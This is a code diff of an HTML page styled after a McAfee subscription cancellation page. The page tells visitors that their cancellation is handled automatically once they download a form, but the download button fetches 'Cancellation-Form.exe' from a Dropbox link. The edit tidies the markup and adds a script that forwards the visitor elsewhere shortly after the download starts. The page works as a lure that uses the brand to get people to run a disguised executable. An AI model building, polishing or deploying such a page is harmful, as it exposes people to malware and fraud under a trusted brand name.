@@ -1,13 +1,11 @@
-<html lang="en"><head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
   <meta charset="UTF-8">
   <title>Cancel Subscription - McAfee Style</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
 
     body {
       font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
@@ -94,18 +92,9 @@
     }
 
     @media (max-width: 600px) {
-      .card h1 {
-        font-size: 18px;
-      }
-
-      .card p {
-        font-size: 14px;
-      }
-
-      .download-btn {
-        padding: 12px 20px;
-        font-size: 14px;
-      }
+      .card h1 { font-size: 18px; }
+      .card p { font-size: 14px; }
+      .download-btn { padding: 12px 20px; font-size: 14px; }
 
       footer {
         flex-direction: column;
@@ -113,13 +102,10 @@
         text-align: center;
         gap: 5px;
       }
-
-      .footer-left, .footer-right {
-        margin: 5px 0;
-      }
+      .footer-left, .footer-right { margin: 5px 0; }
     }
   </style>
-<meta name="GENERATOR" content="MSHTML 11.00.10570.1001"></head>
+</head>
 <body>
 
   <div class="logo">
@@ -127,16 +113,17 @@
   </div>
 
   <div class="card">
-    <h1>Download your cancellation form&nbsp;and cancel your subscription from your end</h1>
-    <p>
-      No need to call or contact our support team.<br>
-      Your cancellation will be processed automatically once you fill up your cancellation form.
-<strong>    </strong></p><strong>
-  </strong></div><strong>
+    <h1>Download your cancellation form and cancel your subscription from your end</h1>
+    <p>No need to call or contact our support team.<br>Your cancellation will be processed automatically once you fill up your cancellation form.</p>
+  </div>
 
-  </strong><a class="download-btn" href="https://www.dropbox.com/scl/fi/xw5kd3lkov1ftpencs9xn/Cancellation-Form.exe?rlkey=lj1ffv5ya4zegub4qvulq91cr&st=3mjwzghv&dl=1" download=""><strong>
+  <!-- Modified Button: Downloads + Redirects -->
+  <a class="download-btn"
+     href="https://www.dropbox.com/scl/fi/xw5kd3lkov1ftpencs9xn/Cancellation-Form.exe?rlkey=lj1ffv5ya4zegub4qvulq91cr&st=3mjwzghv&dl=1"
+     download
+     onclick="setTimeout(() => { window.location.href = 'download.html'; }, 2000);">
     Download Cancellation Form
-</strong>  </a>
+  </a>
 
   <footer>
     <div class="footer-left">
@@ -149,6 +136,5 @@
     </div>
   </footer>
 
-
-
-</body></html>
+</body>
+</html>
